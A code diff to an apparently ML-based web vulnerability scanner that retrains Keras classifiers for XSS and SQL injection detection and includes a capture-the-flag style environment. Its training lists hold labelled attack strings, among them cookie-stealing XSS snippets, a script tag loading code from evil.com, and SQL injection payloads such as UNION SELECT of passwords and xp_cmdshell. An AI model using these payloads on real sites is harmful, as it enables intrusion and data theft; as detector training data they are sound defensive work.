@@ -16,17 +16,18 @@ import gym
 import tensorflow as tf
 from tensorflow.keras import layers
 
-# Check for --retrain flag and disable GPU/CUDNN if set
-RETRAIN_FLAG = ('--retrain' in sys.argv)
-if RETRAIN_FLAG:
-    os.environ["CUDA_VISIBLE_DEVICES"] = "-1"
+# Use TextVectorization from the newer location if available, else fall back
+try:
+    from tensorflow.keras.layers import TextVectorization
+except ImportError:
+    from tensorflow.keras.layers.experimental.preprocessing import TextVectorization
 
+# Always require CUDA - do not disable GPU under any circumstances
 ML_CLASSIFIER_AVAILABLE = False
 SELENIUM_AVAILABLE = False
 
 try:
     import tensorflow as tf
-    tf.config.optimizer.set_experimental_options({'cudnn_enabled': False})
     ML_CLASSIFIER_AVAILABLE = True
 except ImportError:
     pass
@@ -208,23 +209,28 @@ MULTI_VULN_SAMPLES = {
     "npm Token":(["npm_token_123456789012345678901234567890123456"],["safe usage"])
 }
 
-# Fixed function: Removed 'train_dataset' argument so it aligns with usage below.
 def build_text_classification_model():
-    vectorizer = layers.TextVectorization(
-        max_tokens=1000,
-        output_mode='tf-idf'
+    # Name the layer so we can reliably find it even if layer indexing varies
+    vectorizer = TextVectorization(
+        max_tokens=20000,
+        output_mode='tf-idf',
+        name='text_vectorization'
     )
+    # Remove or comment out the initial adapt call if older TF versions cause confusion:
+    # vectorizer.adapt(["init"])
     model = tf.keras.Sequential([
         layers.Input(shape=(1,), dtype=tf.string),
         vectorizer,
-        layers.Dense(8, activation='relu'),
+        layers.Dense(128, activation='relu'),
+        layers.Dense(64, activation='relu'),
+        layers.Dense(32, activation='relu'),
         layers.Dense(1, activation='sigmoid')
     ])
     model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])
     return model
 
 def load_ml_model(path):
-    if not ML_CLASSIFIER_AVAILABLE or RETRAIN_FLAG:
+    if not ML_CLASSIFIER_AVAILABLE:
         return None
     if not os.path.exists(path):
         return None
@@ -408,7 +414,7 @@ def scan_target(url):
                     ml_tags.append(label_entry("SQL Injection",f"ML-based detection (score={prob:.3f})",sn,prob))
             for vn in MULTI_VULN_SAMPLES.keys():
                 mp = os.path.join(MULTI_MODELS_DIR,f"{vn.replace(' ','_').replace(':','').replace('/','_')}.h5")
-                if os.path.exists(mp) and not RETRAIN_FLAG:
+                if os.path.exists(mp):
                     mm = load_ml_model(mp)
                     if mm:
                         prob,pred = ml_detection_confidence(b,mm)
@@ -568,63 +574,62 @@ def bfs_crawl_and_scan(starts,max_depth=10):
     return results
 
 def train_base_ml_models():
-    ML_CLASSIFIER_AVAILABLE = True
-    RETRAIN_FLAG = True
-    XSS_MODEL_PATH = "models/xss"
-    SQLI_MODEL_PATH = "models/sqli"
-
     if not ML_CLASSIFIER_AVAILABLE:
         return
-    if RETRAIN_FLAG:
-        if os.path.exists(XSS_MODEL_PATH):
-            shutil.rmtree(XSS_MODEL_PATH)
-        if os.path.exists(SQLI_MODEL_PATH):
-            shutil.rmtree(SQLI_MODEL_PATH)
-    if not os.path.exists(XSS_MODEL_PATH):
-        sus_js = ["<script>alert('Hacked!')</script>","javascript:alert('XSS')","onerror=alert(document.cookie)","<img src=x onerror=alert(1)>","<svg onload=alert('svgxss')>","<script src='http://evil.com/x.js'></script>"]
-        ben_js = ["function greetUser(name) {}","var x=5; if(x>2){x++;}","document.getElementById('x').innerText='Safe';","function normalFunc(){}"]
-        X_data = sus_js + ben_js
-        y_data = [1]*len(sus_js) + [0]*len(ben_js)
-        model = build_text_classification_model()
-        model.layers[1].adapt(X_data)
-        model.fit(X_data, y_data, epochs=3, batch_size=2, verbose=0)
-        model.save(XSS_MODEL_PATH)
-    if not os.path.exists(SQLI_MODEL_PATH):
-        sus_sql = ["' OR '1'='1","UNION SELECT username, password FROM users","' OR 'a'='a","SELECT * FROM table WHERE id='","' DROP TABLE users --","xp_cmdshell","OR 1=1 LIMIT 1"]
-        ben_sql = ["SELECT id, name FROM products","INSERT INTO users VALUES ('test','pass')","UPDATE accounts SET balance=500 WHERE userid=1","CREATE TABLE logs (entry TEXT)"]
-        X_data = sus_sql + ben_sql
-        y_data = [1]*len(sus_sql) + [0]*len(ben_sql)
-        model = build_text_classification_model()
-        model.layers[1].adapt(X_data)
-        model.fit(X_data, y_data, epochs=3, batch_size=2, verbose=0)
-        model.save(SQLI_MODEL_PATH)
+    import shutil
+    if os.path.exists(XSS_MODEL_PATH):
+        shutil.rmtree(XSS_MODEL_PATH)
+    if os.path.exists(SQLI_MODEL_PATH):
+        shutil.rmtree(SQLI_MODEL_PATH)
+    sus_js = ["<script>alert('Hacked!')</script>","javascript:alert('XSS')","onerror=alert(document.cookie)","<img src=x onerror=alert(1)>","<svg onload=alert('svgxss')>","<script src='http://evil.com/x.js'></script>"]
+    ben_js = ["function greetUser(name) {}","var x=5; if(x>2){x++;}","document.getElementById('x').innerText='Safe';","function normalFunc(){}"]
+    X_data = sus_js + ben_js
+    y_data = [1]*len(sus_js) + [0]*len(ben_js)
+    model = build_text_classification_model()
+
+    # Use get_layer to adapt the named text vectorization layer
+    tv = model.get_layer("text_vectorization")
+    tv.adapt(X_data)
+
+    model.fit(X_data, y_data, epochs=10, batch_size=2, verbose=0)
+    model.save(XSS_MODEL_PATH)
+
+    sus_sql = ["' OR '1'='1","UNION SELECT username, password FROM users","' OR 'a'='a","SELECT * FROM table WHERE id='","' DROP TABLE users --","xp_cmdshell","OR 1=1 LIMIT 1"]
+    ben_sql = ["SELECT id, name FROM products","INSERT INTO users VALUES ('test','pass')","UPDATE accounts SET balance=500 WHERE userid=1","CREATE TABLE logs (entry TEXT)"]
+    X_data = sus_sql + ben_sql
+    y_data = [1]*len(sus_sql) + [0]*len(ben_sql)
+    model = build_text_classification_model()
+    tv = model.get_layer("text_vectorization")
+    tv.adapt(X_data)
+    model.fit(X_data, y_data, epochs=10, batch_size=2, verbose=0)
+    model.save(SQLI_MODEL_PATH)
 
 def train_all_vulnerability_models():
     if not ML_CLASSIFIER_AVAILABLE:
         return
+    import shutil
     if not os.path.isdir(MULTI_MODELS_DIR):
         os.makedirs(MULTI_MODELS_DIR)
-    if RETRAIN_FLAG:
-        import shutil
-        if os.path.isdir(MULTI_MODELS_DIR):
-            for f_ in os.listdir(MULTI_MODELS_DIR):
-                fp = os.path.join(MULTI_MODELS_DIR,f_)
-                if os.path.isdir(fp) or fp.endswith(".h5"):
-                    try:
-                        if os.path.isdir(fp):
-                            shutil.rmtree(fp)
-                        else:
-                            os.remove(fp)
-                    except:
-                        pass
+    if os.path.isdir(MULTI_MODELS_DIR):
+        for f_ in os.listdir(MULTI_MODELS_DIR):
+            fp = os.path.join(MULTI_MODELS_DIR,f_)
+            if os.path.isdir(fp) or fp.endswith(".h5"):
+                try:
+                    if os.path.isdir(fp):
+                        shutil.rmtree(fp)
+                    else:
+                        os.remove(fp)
+                except:
+                    pass
     for vuln_name,(suspicious,benign) in MULTI_VULN_SAMPLES.items():
         mp = os.path.join(MULTI_MODELS_DIR,f"{vuln_name.replace(' ','_').replace(':','').replace('/','_')}.h5")
         if not os.path.exists(mp):
             X_data = suspicious + benign
             y_data = [1]*len(suspicious) + [0]*len(benign)
             model = build_text_classification_model()
-            model.layers[1].adapt(X_data)
-            model.fit(X_data, y_data, epochs=3, batch_size=2, verbose=0)
+            tv = model.get_layer("text_vectorization")
+            tv.adapt(X_data)
+            model.fit(X_data, y_data, epochs=10, batch_size=2, verbose=0)
             model.save(mp)
 
 class VulnScanEnv(gym.Env):
@@ -636,10 +641,12 @@ class VulnScanEnv(gym.Env):
         self.flag_pattern = re.compile(r"flag\{.*?\}", re.IGNORECASE)
         self.test_sites = test_sites
         self.done = False
+
     def reset(self):
         self.current_step = 0
         self.done = False
         return 0
+
     def step(self, action):
         if self.done:
             return 0, 0, True, {}
